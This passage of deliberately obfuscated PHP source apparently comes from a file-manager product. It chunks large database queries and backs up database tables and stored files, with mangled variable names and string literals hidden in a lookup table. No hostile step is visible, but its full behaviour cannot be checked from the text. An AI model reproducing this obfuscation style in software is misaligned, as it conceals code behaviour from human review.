rtrim($†¹×•ùˆ, $´ü²ÉÈæ[60]) . $´ü²ÉÈæ[474] . $´ö¢É¬„->parseWhere($Éõ¬ùü¿) . $´ü²ÉÈæ[475]; $this->execute($®ó°£); } $this->chunkEventCheck(count($•Ä‹ï˜)); } $this->chunkEventSet(); } private function saveAllChunkMake($ªÁ½¹Â•) { $å„µ•ó =& $_SERVER[øşô´çË]; $…ğ÷ÈÁ¢ = self::SQL_WHERE_IN_CHUNK; $ªÁ½¹Â• = is_array($ªÁ½¹Â•) ? $ªÁ½¹Â• : array(); $¶‘“Éùí = array(); $”ÛÑ”ÏÅ = ceil(count($ªÁ½¹Â•) / $…ğ÷ÈÁ¢); for ($ÖË†Å“„ = 0; $ÖË†Å“„ < $”ÛÑ”ÏÅ; $ÖË†Å“„++) { $ÁÊ˜Ì–“ = array(); $×¾´Ò‹Ñ = array_slice($ªÁ½¹Â•, $ÖË†Å“„ * $…ğ÷ÈÁ¢, $…ğ÷ÈÁ¢); foreach ($×¾´Ò‹Ñ as $ÇÉÉ÷ş¡) { if (!is_array($ÇÉÉ÷ş¡) || count($ÇÉÉ÷ş¡) < 4 || count($ÇÉÉ÷ş¡) % 2 != 0) { continue; } $Û‡ŠÑÒí = array(); for ($ªÒŠÏÉÌ = 2; $ªÒŠÏÉÌ < count($ÇÉÉ÷ş¡); $ªÒŠÏÉÌ += 2) { $Û‡ŠÑÒí[$ÇÉÉ÷ş¡[$ªÒŠÏÉÌ]] = $ÇÉÉ÷ş¡[$ªÒŠÏÉÌ + 1]; } $ÁÊ˜Ì–“[] = array($å„µ•ó[464] => $ÇÉÉ÷ş¡[0], $å„µ•ó[465] => $ÇÉÉ÷ş¡[1], $å„µ•ó[466] => $Û‡ŠÑÒí); } $¶‘“Éùí[] = $ÁÊ˜Ì–“; } return $¶‘“Éùí; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ë¤Û­æí = false, $µ¦¤í = false) { $this->_chunkEvent = $Ë¤Û­æí; $this->_chunkEventParam = $µ¦¤í; } private function chunkEventCheck($Ç¡¡—Ò) { if (!$this->_chunkEvent) { return; } $¶ìêÌ´ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¶ìêÌ´[$_SERVER[øşô´çË][476]] = $Ç¡¡—Ò; Hook::trigger($this->_chunkEvent, $¶ìêÌ´); } public function addAll($ÂÕĞû×, $Ğ»´ÙÜ½ = array(), $ï‘×ŒÙÎ = false) { $ş¹¨½®Ã =& $_SERVER[øşô´çË]; ignore_timeout(); $Ãı®ğ«Å = self::SQL_WHERE_IN_CHUNK; if (empty($ÂÕĞû×)) { $this->error = think_lang($ş¹¨½®Ã[358]); return !1; } $Ğ»´ÙÜ½ = $this->_parseOptions($Ğ»´ÙÜ½); foreach ($ÂÕĞû× as $ËèÒêÁ÷ => $Ğ„Úé•ö) { $ÂÕĞû×[$ËèÒêÁ÷] = $this->_facade($Ğ„Úé•ö); $this->_beforeInsert($ÂÕĞû×[$ËèÒêÁ÷], $Ğ»´ÙÜ½); } if (method_exists($this->db, $ş¹¨½®Ã[359])) { for ($äÌÆ»Õ¥ = 0; $äÌÆ»Õ¥ < count($ÂÕĞû×); $äÌÆ»Õ¥ += $Ãı®ğ«Å) { $Æ³Î­üÒ = array_slice($ÂÕĞû×, $äÌÆ»Õ¥, $Ãı®ğ«Å); if (!is_array($Æ³Î­üÒ) || count($Æ³Î­üÒ) == 0) { break; } $‡êö”õÉ = $this->db->insertAll($Æ³Î­üÒ, $Ğ»´ÙÜ½, $ï‘×ŒÙÎ); $this->chunkEventCheck(count($Æ³Î­üÒ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÂÕĞû× as $ËèÒêÁ÷ => $Ğ„Úé•ö) { $‡êö”õÉ = $this->db->insert($Ğ„Úé•ö, $Ğ»´ÙÜ½, $ï‘×ŒÙÎ); } $this->commit(); } if (!1 !== $‡êö”õÉ) { $áÊ±‚ = $this->getLastInsID(); if ($áÊ±‚) { return $áÊ±‚; } } return $‡êö”õÉ; } public function save($œù•Øœ² = '', $ğµ›¬†ô = array()) { $ Ì–öå‚ =& $_SERVER[øşô´çË]; $ßª¶ñ… = self::SQL_WHERE_IN_CHUNK; $ Ø›±ùû = $this->optionsValue(); $˜â‘öÃ = $this->findWhereField($ Ø›±ùû); if (!$˜â‘öÃ) { return parent::save($œù•Øœ², $ğµ›¬†ô); } $¥½ŠÕ é = 0; $òÌŞ‰ = $ Ø›±ùû[$ Ì–öå‚[362]][$˜â‘öÃ][1]; $òÌŞ‰ = is_array($òÌŞ‰) ? $òÌŞ‰ : array(); $”ÓÌşô = count($òÌŞ‰); for ($´Œ»ĞÜ­ = 0; $´Œ»ĞÜ­ < $”ÓÌşô; $´Œ»ĞÜ­ += $ßª¶ñ…) { $ä‡ÁÒÄé = array_slice($òÌŞ‰, $´Œ»ĞÜ­, $ßª¶ñ…); if (!is_array($ä‡ÁÒÄé) || count($ä‡ÁÒÄé) == 0) { break; } $ Ø›±ùû[$ Ì–öå‚[362]][$˜â‘öÃ][1] = $ä‡ÁÒÄé; $this->optionsValue($ Ø›±ùû); $¥½ŠÕ é += parent::save($œù•Øœ², $ğµ›¬†ô); $this->chunkEventCheck(count($ä‡ÁÒÄé)); } $this->chunkEventSet(); return $¥½ŠÕ é; } public function add($ó¼Ò°µ = '', $˜·ÁĞÏ¿ = array(), $ºı¹Ë¢Ÿ = false) { if ($this->addTaskStatus && is_array($ó¼Ò°µ)) { $this->addTaskData[] = $ó¼Ò°µ; return; } return parent::add($ó¼Ò°µ, $˜·ÁĞÏ¿, $ºı¹Ë¢Ÿ); } public function parseWhereLike($ÑŠ‘Õƒ–, $ï–Âö²ó = '', $øİ¸ÄÍì = false, &$‚æÄü£¡ = false) { $Å—îö¡— =& $_SERVER[øşô´çË]; $š§ÆË±Ø = $GLOBALS[$Å—îö¡—[6]][$Å—îö¡—[477]]; if (!$š§ÆË±Ø[$Å—îö¡—[478]]) { return $ÑŠ‘Õƒ–; } if (!in_array($this->tableName, array($Å—îö¡—[438], $Å—îö¡—[479], $Å—îö¡—[480], $Å—îö¡—[481]))) { return $ÑŠ‘Õƒ–; } if (!is_array($ÑŠ‘Õƒ–)) { return $ÑŠ‘Õƒ–; } $· ¨š¾  = array(); $ÏÔ®§à = 0; foreach ($ÑŠ‘Õƒ– as $½¡´ãíÊ => $·á¼à°›) { if (is_array($·á¼à°›) && count($·á¼à°›) == 2 && $·á¼à°›[0] == $Å—îö¡—[482] && is_string($·á¼à°›[1]) && substr($·á¼à°›[1], 0, 1) == $Å—îö¡—[483] && substr($·á¼à°›[1], strlen($·á¼à°›[1]) - 1, 1) == $Å—îö¡—[483]) { $‚æÄü£¡ = !0; $º’«¦ó¶ = is_string($½¡´ãíÊ) ? $½¡´ãíÊ : $ï–Âö²ó; $Û›é°Ö¢ = substr($·á¼à°›[1], 1, strlen($·á¼à°›[1]) - 2); $Û›é°Ö¢ = $this->db->escapeString($Û›é°Ö¢); if (!strpos($º’«¦ó¶, $Å—îö¡—[10])) { $º’«¦ó¶ = $Å—îö¡—[484] . $º’«¦ó¶ . $Å—îö¡—[484]; } $èÁ’©äÕ = $Å—îö¡—[230] . $Û›é°Ö¢ . $Å—îö¡—[230]; $Û›é°Ö¢ = str_replace(array($Å—îö¡—[10], $Å—îö¡—[485]), $Å—îö¡—[486], $Û›é°Ö¢); if ($š§ÆË±Ø[$Å—îö¡—[487]]) { $èÁ’©äÕ = $Å—îö¡—[488] . $Û›é°Ö¢ . $Å—îö¡—[489]; if ($š§ÆË±Ø[$Å—îö¡—[490]]) { $èÁ’©äÕ = $Å—îö¡—[489] . $Û›é°Ö¢ . $Å—îö¡—[488]; } } $Ç¾¼Èù² = Hook::trigger($Å—îö¡—[491], $Û›é°Ö¢, $èÁ’©äÕ); if ($Ç¾¼Èù²) { $èÁ’©äÕ = $Ç¾¼Èù²; } $· ¨š¾ [$ÏÔ®§à] = $Å—îö¡—[492] . $º’«¦ó¶ . $Å—îö¡—[493] . $èÁ’©äÕ . $Å—îö¡—[494]; $ÏÔ®§à++; continue; } if (is_array($·á¼à°›)) { $ï–Âö²ó = is_string($½¡´ãíÊ) ? $½¡´ãíÊ : $ï–Âö²ó; $·á¼à°› = $this->parseWhereLike($·á¼à°›, $ï–Âö²ó, !0, $‚æÄü£¡); } if (is_numeric($½¡´ãíÊ)) { $· ¨š¾ [$ÏÔ®§à] = $·á¼à°›; $ÏÔ®§à++; } else { $· ¨š¾ [$½¡´ãíÊ] = $·á¼à°›; } } if ($‚æÄü£¡ && !$øİ¸ÄÍì) { } return $· ¨š¾ ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ƒØ¨íÌ = array()) { $Ñ¯ë„ü =& $_SERVER[øşô´çË]; $Æ™êÓº = self::SQL_WHERE_IN_CHUNK; $ï´Ï­ÈÉ = $this->optionsValue(); $ÆÊúÌœ¸ = $this->findWhereField($ï´Ï­ÈÉ); if (!$ÆÊúÌœ¸ || isset($ï´Ï­ÈÉ[$Ñ¯ë„ü[377]]) || isset($ï´Ï­ÈÉ[$Ñ¯ë„ü[437]])) { return parent::select($ƒØ¨íÌ); } $á¯‡ù‰â = $ï´Ï­ÈÉ[$Ñ¯ë„ü[362]][$ÆÊúÌœ¸][1]; $á¯‡ù‰â = is_array($á¯‡ù‰â) ? $á¯‡ù‰â : array(); $‰ƒ¨ §Ö = null; for ($õ›ÄÁ÷ = 0; $õ›ÄÁ÷ < count($á¯‡ù‰â); $õ›ÄÁ÷ += $Æ™êÓº) { $”¼İº©Ì = array_slice($á¯‡ù‰â, $õ›ÄÁ÷, $Æ™êÓº); if (!is_array($”¼İº©Ì) || count($”¼İº©Ì) == 0) { break; } $ï´Ï­ÈÉ[$Ñ¯ë„ü[362]][$ÆÊúÌœ¸][1] = $”¼İº©Ì; $this->optionsValue($ï´Ï­ÈÉ); $Ìú˜Ğš = parent::select($ƒØ¨íÌ); if (!$Ìú˜Ğš) { continue; } $‰ƒ¨ §Ö = is_array($‰ƒ¨ §Ö) ? $‰ƒ¨ §Ö : array(); $‰ƒ¨ §Ö = array_merge($‰ƒ¨ §Ö, $Ìú˜Ğš); } return $‰ƒ¨ §Ö; } public function delete($àÊüªÈÀ = array()) { $Ä¡üªõ­ =& $_SERVER[øşô´çË]; $Šì¥¤ = self::SQL_WHERE_IN_CHUNK; $·È°šö = $this->optionsValue(); $û¾¬Ë¤ = $this->findWhereField($·È°šö); if (!$û¾¬Ë¤) { return parent::delete($àÊüªÈÀ); } $µ»Í¬Ş‡ = 0; $Ÿ¥òòé = $·È°šö[$Ä¡üªõ­[362]][$û¾¬Ë¤][1]; $Ÿ¥òòé = is_array($Ÿ¥òòé) ? $Ÿ¥òòé : array(); for ($ïŸˆ’¦– = 0; $ïŸˆ’¦– < count($Ÿ¥òòé); $ïŸˆ’¦– += $Šì¥¤) { $á»ÕêçŞ = array_slice($Ÿ¥òòé, $ïŸˆ’¦–, $Šì¥¤); if (!is_array($á»ÕêçŞ) || count($á»ÕêçŞ) == 0) { break; } $·È°šö[$Ä¡üªõ­[362]][$û¾¬Ë¤][1] = $á»ÕêçŞ; $this->optionsValue($·È°šö); $µ»Í¬Ş‡ += parent::delete($àÊüªÈÀ); } return $µ»Í¬Ş‡; } private function findWhereField($İÔ´¼Èë) { $†É«ã–¢ =& $_SERVER[øşô´çË]; $£ç€şä = self::SQL_WHERE_IN_CHUNK; if (!is_array($İÔ´¼Èë) || !is_array($İÔ´¼Èë[$†É«ã–¢[362]])) { return !1; } foreach ($İÔ´¼Èë[$†É«ã–¢[362]] as $ãï„Ÿİ’ => $öİ´·‹¬) { if (is_array($öİ´·‹¬) && isset($öİ´·‹¬[0]) && is_string($öİ´·‹¬[0]) && strtolower($öİ´·‹¬[0]) == $†É«ã–¢[7] && is_array($öİ´·‹¬[1]) && count($öİ´·‹¬[1]) > $£ç€şä) { ignore_timeout(); return $ãï„Ÿİ’; } } return !1; } public function setMasterDB($ÕĞóâêå = true) { think_config($_SERVER[øşô´çË][495], $ÕĞóâêå); } } goto eë…÷Ù§; E¥ªÂõœ­ø: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $äòîâÎ¶ =& $_SERVER[øşô´çË]; $›ÇÏ³°‘ = Backup::get(); self::$io = $›ÇÏ³°‘[$äòîâÎ¶[854]]; self::$name = $›ÇÏ³°‘[$äòîâÎ¶[42]]; $¸ª­¤® = new DbManage(); $µ›„¢Óô = $¸ª­¤®->dbType(); $¼Ùà®¡ = array($äòîâÎ¶[882] => $µ›„¢Óô, $äòîâÎ¶[883] => time()); Backup::set($¼Ùà®¡); $öºÅ±«€ = $this->tmpFilesPath() . $äòîâÎ¶[884] . self::$name . $äòîâÎ¶[8]; del_dir($öºÅ±«€); mk_dir($öºÅ±«€); $“«†¯ı¯ = $Ø Šï = 0; try { $ß÷î—‡Å = $¸ª­¤®->db()->getTables(); } catch (Exception $¦“Ô¨³) { Backup::log($äòîâÎ¶[885] . $¦“Ô¨³->getMessage()); return !1; } $ß÷î—‡Å = array_diff($ß÷î—‡Å, array($äòîâÎ¶[886], $äòîâÎ¶[887])); foreach ($ß÷î—‡Å as $ª®»”…„) { if ($ª®»”…„ == $äòîâÎ¶[481]) { continue; } $“«†¯ı¯ += $¸ª­¤®->model($ª®»”…„)->count(); } $½ïÓ‘­ = new Task($äòîâÎ¶[888], $äòîâÎ¶[881], $“«†¯ı¯, LNG($äòîâÎ¶[889]) . $äòîâÎ¶[890] . LNG($äòîâÎ¶[891])); $GLOBALS[$äòîâÎ¶[892]] = self::$name; foreach ($ß÷î—‡Å as $ª®»”…„) { $ôšÒË = $öºÅ±«€ . $ª®»”…„ . $äòîâÎ¶[893]; if ($ª®»”…„ == $äòîâÎ¶[481]) { @touch($ôšÒË); continue; } $Ø Šï += $¸ª­¤®->sqlFromDb($ª®»”…„, $ôšÒË, $½ïÓ‘­); } unset($GLOBALS[$äòîâÎ¶[892]]); $½ïÓ‘­->end(); if ($Ø Šï > $“«†¯ı¯) { $“«†¯ı¯ = $Ø Šï; } $¼Ùà®¡ = array($äòîâÎ¶[882] => $µ›„¢Óô, $äòîâÎ¶[878] => 1, $äòîâÎ¶[894] => $“«†¯ı¯, $äòîâÎ¶[895] => $Ø Šï, $äòîâÎ¶[896] => time()); Backup::set($¼Ùà®¡); if (!$“«†¯ı¯ || abs($“«†¯ı¯ - $Ø Šï) / $“«†¯ı¯ > 0.01) { $ñ¶îÓá÷ = $äòîâÎ¶[897]; if (!stristr(I18n::getType(), $äòîâÎ¶[898])) { $ñ¶îÓá÷ = $äòîâÎ¶[899]; } Backup::log(array($ñ¶îÓá÷, $¼Ùà®¡)); return !1; } return !0; } private function tmpFilesPath() { $ï°Ì–‹³ =& $_SERVER[øşô´çË]; $„ç¹Ó¶ç = TEMP_FILES; if ($GLOBALS[$ï°Ì–‹³[6]][$ï°Ì–‹³[102]][$ï°Ì–‹³[900]]) { $„ç¹Ó¶ç = $GLOBALS[$ï°Ì–‹³[6]][$ï°Ì–‹³[102]][$ï°Ì–‹³[900]]; if (!mk_dir($„ç¹Ó¶ç) || !is_writable($„ç¹Ó¶ç) || !IO::mkfile($„ç¹Ó¶ç . $ï°Ì–‹³[901])) { $„ç¹Ó¶ç = TEMP_FILES; } } return $„ç¹Ó¶ç; } } class BackupDbFile { public function __construct() { } public function index() { $…ìÊ·é =& $_SERVER[øşô´çË]; $ß¬ê¨ş­ = Backup::get(); $“íñ¢èâ = $ß¬ê¨ş­[$…ìÊ·é[42]]; $‰ ¼Üï = $this->tmpFilesPath() . "\x62\x61\x63\153\165\160\x5f{$“íñ¢èâ}\57"; $ª¼‰•›õ = $this->backupPath($ß¬ê¨ş­); if (!($ª¼‰•›õ = IO::mkdir($ª¼‰•›õ))) { Backup::log($…ìÊ·é[902] . $ª¼‰•›õ); return !1; } $¿ÜÍ¦ìş = new DbManage(); $ ’¶ê­‡ = $¿ÜÍ¦ìş->getSqlFile(); if (!$ ’¶ê­‡ || !$ ’¶ê­‡[$…ìÊ·é[903]] || !$ ’¶ê­‡[$…ìÊ·é[23]]) { Backup::log($…ìÊ·é[904]); return !1; } IO::move($ ’¶ê­‡[$…ìÊ·é[903]], $‰ ¼Üï); IO::move($ ’¶ê­‡[$…ìÊ·é[23]], $‰ ¼Üï); $¿ÜÍ¦ìş->mixBakList($‰ ¼Üï); $Ìõµ˜çğ = IO::listPath($‰ ¼Üï); $µã«§¥ = isset($Ìõµ˜çğ[$…ìÊ·é[96]]) ? $Ìõµ˜çğ[$…ìÊ·é[96]] : array(); $†«ñØßÆ = array_sum(array_column($µã«§¥, $…ìÊ·é[89])); if (!$†«ñØßÆ) { Backup::log($…ìÊ·é[905] . $‰ ¼Üï); return !1; } $ù²Âº·™ = array($…ìÊ·é[906] => $†«ñØßÆ, $…ìÊ·é[907] => time()); Backup::set($ù²Âº·™); Hook::trigger($…ìÊ·é[908], $‰ ¼Üï, $ª¼‰•›õ); $„Ó”¸ê = new TaskFileTransfer($…ìÊ·é[908], $…ìÊ·é[881], count($µã«§¥), LNG($…ìÊ·é[889]) . $…ìÊ·é[485] . LNG($…ìÊ·é[891]) . $…ìÊ·é[909]); $„Ó”¸ê->task[$…ìÊ·é[866]] = $†«ñØßÆ; foreach ($Ìõµ˜çğ[$…ìÊ·é[96]] as $‰Ûà¼åó) { $»Ì—œ‹ = IO::move($‰Ûà¼åó[$…ìÊ·é[97]], $ª¼‰•›õ); if (!$»Ì—œ‹) { $„Ó”¸ê->end(); $ı³Õªü  = IO::getLastError($…ìÊ·é[910] . $‰Ûà¼åó[$…ìÊ·é[97]] . $…ìÊ·é[911] . $ª¼‰•›õ . $…ìÊ·é[185]); Backup::log($ı³Õªü ); return !1; } } $„Ó”¸ê->end(); $ù²Âº·™ = array($…ìÊ·é[912] => $†«ñØßÆ, $…ìÊ·é[913] => time()); Backup::set($ù²Âº·™); return !0; } private function backupPath($õñâééÄ) { $ Œ™õÈı =& $_SERVER[øşô´çË]; $¤ÉøºÂÔ = $õñâééÄ[$ Œ™õÈı[42]]; $êò‰ÔÍş = Model($ Œ™õÈı[875])->get($ Œ™õÈı[876]); $£Šø²–õ = substr(md5($ Œ™õÈı[877] . $êò‰ÔÍş . $¤ÉøºÂÔ), 0, 8); return "\x7b\151\x6f\x3a{$õñâééÄ[$ Œ™õÈı[854]]}\175\x2f\144\x61\164\141\x62\141\163\145\x2f\x62\x61\143\153\165\160\57" . $¤ÉøºÂÔ . $ Œ™õÈı[11] . $£Šø²–õ; } private function tmpFilesPath() { $½ÃÀ·Şâ =& $_SERVER[øşô´çË]; $¹Óû’× = TEMP_FILES; if ($GLOBALS[$½ÃÀ·Şâ[6]][$½ÃÀ·Şâ[102]][$½ÃÀ·Şâ[900]]) { $¹Óû’× = $GLOBALS[$½ÃÀ·Şâ[6]][$½ÃÀ·Şâ[102]][$½ÃÀ·Şâ[900]]; if (!mk_dir($¹Óû’×) || !is_writable($¹Óû’×) || !IO::mkfile($¹Óû’× . $½ÃÀ·Şâ[901])) { $¹Óû’× = TEMP_FILES; } } return $¹Óû’×; } } class BackupFile { protected $bakVer = "\x6f\x6c\x64"; public function __construct($¨¥ĞÖ†š = false) { $Ğ•ÚïÔ =& $_SERVER[øşô´çË]; $this->bakVer = $¨¥ĞÖ†š ? $Ğ•ÚïÔ[914] : $Ğ•ÚïÔ[915]; } public function index() { $‚òİ€¹§ = Backup::get(); $ìÅ¯Ö€ƒ = $‚òİ€¹§[$_SERVER[øşô´çË][858]][$_SERVER[øşô´çË][240]][$_SERVER[øşô´çË][566]]; $áÆ¤¡İÙ = array($_SERVER[øşô´çË][567] => array($_SERVER[øşô´çË][916], $ìÅ¯Ö€ƒ), $_SERVER[øşô´çË][917] => array($_SERVER[øşô´çË][415], $‚òİ€¹§[$_SERVER[øşô´çË][854]])); $ª¹×¸ = (int) Model($_SERVER[øşô´çË][918])->where($áÆ¤¡İÙ)->count($_SERVER[øşô´çË][566]); $µû‹¾Õ¬ = (int) Model($_SERVER[øşô´çË][918])->where($áÆ¤¡İÙ)->sum($_SERVER[øşô´çË][89]); $Ë˜É”Â = new TaskFileTransfer($_SERVER[øşô´çË][919], $_SERVER[øşô´çË][881], $ª¹×¸, LNG($_SERVER[øşô´çË][889]) . $_SERVER[øşô´çË][890] . LNG($_SERVER[øşô´çË][920])); $Ë˜É”Â->task[$_SERVER[øşô´çË][866]] = $µû‹¾Õ¬; $ªò ¢ùô = array($_SERVER[øşô´çË][921] => $ª¹×¸, $_SERVER[øşô´çË][922] => $µû‹¾Õ¬, $_SERVER[øşô´çË][923] => time()); Backup::set($ªò ¢ùô); $®áÛ¨ = !0; $ëÁø—ş™ = $this->storeIds(); $£ıè¤ÆÛ = 1; $·ƒöº‰ = 1000; $Š®ƒ™‰ = $ÆÎëüã• = 0; $ã€´¯Šç = array(); $ÙÀà†èñ = $º†ç§± = 0; do { $®Øı¹–æ = $_SERVER[øşô´çË][924]; $¬ÂÖƒ·„ = Model($_SERVER[øşô´çË][918])->where($áÆ¤¡İÙ)->field($®Øı¹–æ)->order($_SERVER[øşô´çË][925])->selectPage($·ƒöº‰, $£ıè¤ÆÛ); $şìÑ„ï¨ = !empty($¬ÂÖƒ·„[$_SERVER[øşô´çË][455]]) ? $¬ÂÖƒ·„[$_SERVER[øşô´çË][455]] : array(); foreach ($şìÑ„ï¨ as $¦¥¼ÉŞİ) { if (!$this->_fileExist($¦¥¼ÉŞİ, $ã€´¯Šç, $ëÁø—ş™)) { Backup::log($_SERVER[øşô´çË][926] . $¦¥¼ÉŞİ[$_SERVER[øşô´çË][566]] . $_SERVER[øşô´çË][927] . $¦¥¼ÉŞİ[$_SERVER[øşô´çË][97]]); continue; } $Œõ¨ÊäĞ = $¦¥¼ÉŞİ[$_SERVER[øşô´çË][97]]; $âÁ„úÈ = "\173\151\157\x3a{$‚òİ€¹§[$_SERVER[øşô´çË][854]]}\x7d" . substr($Œõ¨ÊäĞ, strlen("\x7b\x69\157\x3a{$¦¥¼ÉŞİ[$_SERVER[øşô´çË][928]]}\x7d")); if (IO::exist($âÁ„úÈ)) { $Ë˜É”Â->updateFileEnd($¦¥¼ÉŞİ[$_SERVER[øşô´çË][42]], $¦¥¼ÉŞİ[$_SERVER[øşô´çË][89]]); } else { $âÁ„úÈ = get_path_father($âÁ„úÈ); IO::mkdir($âÁ„úÈ); if (!IO::copy($Œõ¨ÊäĞ, $âÁ„úÈ, $_SERVER[øşô´çË][929])) { Backup::log($_SERVER[øşô´çË][930] . $Œõ¨ÊäĞ . $_SERVER[øşô´çË][911] . $âÁ„úÈ . $_SERVER[øşô´çË][185]); $®áÛ¨ = !1; break; } } $ìÅ¯Ö€ƒ = $¦¥¼ÉŞİ[$_SERVER[øşô´çË][566]]; $ÆÎëüã• += 1; $Š®ƒ™‰ += $¦¥¼ÉŞİ[$_SERVER[øşô´çË][89]]; $º†ç§± += 1; $ÙÀà†èñ += $¦¥¼ÉŞİ[$_SERVER[øşô´çË][89]]; if ($Š®ƒ™‰ >= 1024 * 1024 * 100) { $ªò ¢ùô = array($_SERVER[øşô´çË][853] => $ìÅ¯Ö€ƒ, $_SERVER[øşô´çË][931] => $º†ç§±, $_SERVER[øşô´çË][932] => $ÙÀà†èñ); Backup::set($ªò ¢ùô); $Š®ƒ™‰ = $ÆÎëüã• = 0; } } $ÒÇ‘ÂÅé = count($şìÑ„ï¨); $£ıè¤ÆÛ++; } while ($ÒÇ‘ÂÅé == $·ƒöº‰); $Ë˜É”Â->end(); $ªò ¢ùô = array($_SERVER[øşô´çË][933] => 1, $_SERVER[øşô´çË][864] => time(), $_SERVER[øşô´çË][880] => 1, $_SERVER[øşô´çË][853] => $ìÅ¯Ö€ƒ, $_SERVER[øşô´çË][934] => time()); if ($ÆÎëüã•) { $ªò ¢ùô[$_SERVER[øşô´çË][931]] = $º†ç§±; $ªò ¢ùô[$_SERVER[øşô´çË][932]] = $ÙÀà†èñ; } Backup::set($ªò ¢ùô); return !0; } private function _fileExist($¢¡µÜ÷, &$«¾¨„ , $°¼ÚÒûŒ) { $¤Öì¥ò™ =& $_SERVER[øşô´çË]; $÷Çä½’‚ = $¢¡µÜ÷[$¤Öì¥ò™[97]]; if (in_array($¢¡µÜ÷[$¤Öì¥ò™[566]], $«¾¨„ )) { return !1; } if (!in_array($¢¡µÜ÷[$¤Öì¥ò™[928]], $°¼ÚÒûŒ)) { return !1; } if (IO::exist($÷Çä½’‚)) { return !0; } $İûØĞûº = get_path_father($÷Çä½’‚); if (IO::exist($İûØĞûº)) { $«¾¨„ [] = $¢¡µÜ÷[$¤Öì¥ò™[566]]; return !1; } $®Şš·ã½ = array($¤Öì¥ò™[928] => $¢¡µÜ÷[$¤Öì¥ò™[928]], $¤Öì¥ò™[97] => array($¤Öì¥ò™[482], "{$İûØĞûº}\x25")); $“¡óí‘ = Model($¤Öì¥ò™[918])->where($®Şš·ã½)->field($¤Öì¥ò™[567])->select(); $«¾¨„  = array_merge($«¾¨„ , array_to_keyvalue($“¡óí‘, $¤Öì¥ò™[12], $¤Öì¥ò™[566])); return !1; } private function _fileFilter($èñõéÚ) { $»µ»‰—” =& $_SERVER[øşô´çË]; return; if (empty($èñõéÚ)) { return; } $¢§®Úö = array($»µ»‰—”[566] => array($»µ»‰—”[7], array_unique($èñõéÚ))); $È—–Ì™­ = Model($»µ»‰—”[935])->where($¢§®Úö)->field($»µ»‰—”[201])->select(); foreach ($È—–Ì™­ as $Ôû¢Ù) { Model($»µ»‰—”[935])->remove($Ôû¢Ù[$»µ»‰—”[201]], !1); } } private function storeIds() { $òúó·“ =& $_SERVER[øşô´çË]; $—¬ Óƒï = Model($òúó·“[870])->listData(); $·å¿³Ÿâ = array(); $¯òéĞÛ = $GLOBALS[$òúó·“[6]][$òúó·“[102]][$òúó·“[936]]; foreach ($—¬ Óƒï as $°ÊÃ´æí) { $¯âõÕ– = strtolower($°ÊÃ´æí[$òúó·“[106]]); if (!isset($¯òéĞÛ[$¯âõÕ–])) { continue; } $Üƒˆ©ø³ = $òúó·“[87] . (isset($¯òéĞÛ[$¯âõÕ–]) ? $¯òéĞÛ[$¯âõÕ–] : ucfirst($¯âõÕ–)); if (!class_exists($Üƒˆ©ø³)) { continue; } $·å¿³Ÿâ[] = $°ÊÃ´æí[$òúó·“[496]]; } return $·å¿³Ÿâ; } public function start($Íû‚ò¡, $‰üÉŠ‚¼) { $õ¹¦ŒöÉ =& $_SERVER[øşô´çË]; $ôÄ‰”İö = KodIO::makePath(KodIO::KOD_IO, $Íû‚ò¡); if (!$this->checkStore($Íû‚ò¡)) { write_log($õ¹¦ŒöÉ[937] . $ôÄ‰”İö, $õ¹¦ŒöÉ[938]); return; } $ŒĞ´Šà = KodIO::defaultDriver(); if ($ŒĞ´Šà[$õ¹¦ŒöÉ[496]] == $Íû‚ò¡) { write_log($õ¹¦ŒöÉ[939] . $ôÄ‰”İö, $õ¹¦ŒöÉ[938]); return; } $ÇÇšÆÉè = $õ¹¦ŒöÉ[940]; $¨Øë…ïÒ = Task::get($ÇÇšÆÉè); if ($¨Øë…ïÒ) { if ($¨Øë…ïÒ[$õ¹¦ŒöÉ[852]] == $õ¹¦ŒöÉ[941]) { return; } Task::kill($ÇÇšÆÉè); } $°ğöš†ƒ = array($õ¹¦ŒöÉ[854] => $Íû‚ò¡, $õ¹¦ŒöÉ[566] => 0, $õ¹¦ŒöÉ[214] => 0, $õ¹¦ŒöÉ[858] => array($õ¹¦ŒöÉ[861] => 0, $õ¹¦ŒöÉ[942] => 0, $õ¹¦ŒöÉ[866] => 0, $õ¹¦ŒöÉ[943] => 0, $õ¹¦ŒöÉ[944] => 0)); $€•š× = Model($õ¹¦ŒöÉ[875])->get($õ¹¦ŒöÉ[945], $õ¹¦ŒöÉ[881]); $€•š× = json_decode($€•š×, !0); if (!$€•š×) { $€•š× = array(); } if ($€•š×[$õ¹¦ŒöÉ[854]] && $€•š×[$õ¹¦ŒöÉ[854]] != $Íû‚ò¡) { $€•š×[$õ¹¦ŒöÉ[566]] = 0; $€•š×[$õ¹¦ŒöÉ[854]] = $Íû‚ò¡; } $€•š× = array_merge($°ğöš†ƒ, $€•š×); $ÁÇ¢ÀüË = _get($GLOBALS, $õ¹¦ŒöÉ[7], array()); if ($ÁÇ¢ÀüË[$õ¹¦ŒöÉ[857]] == $õ¹¦ŒöÉ[101] && $ÁÇ¢ÀüË[$õ¹¦ŒöÉ[946]] == $õ¹¦ŒöÉ[101] || !$€•š×[$õ¹¦ŒöÉ[566]]) { $€•š× = $°ğöš†ƒ; } $ôÄ‰”İö = KodIO::makePath(KodIO::KOD_IO, $€•š×[$õ¹¦ŒöÉ[854]]); $ÌÙòãÌ« = $ôÄ‰”İö . $õ¹¦ŒöÉ[947]; if (!file_exists($ÌÙòãÌ«)) { $±©˜ìı = file_get_contents(__DIR__ . $õ¹¦ŒöÉ[948]); if (defined($õ¹¦ŒöÉ[949]) && INSTALL_CHANNEL) { $±©˜ìı = str_replace($õ¹¦ŒöÉ[950], INSTALL_CHANNEL, $±©˜ìı); } file_put_contents($ÌÙòãÌ«, $±©˜ìı); } $Ï‡Œ¿‹ı = $‰üÉŠ‚¼ * 60 * 0.8; $‚ºç£ıı = timeFloat(); $ÎæÎéÌ¦ = Model($õ¹¦ŒöÉ[569]); $û¥‘èØ± = array($õ¹¦ŒöÉ[567] => array($õ¹¦ŒöÉ[916], 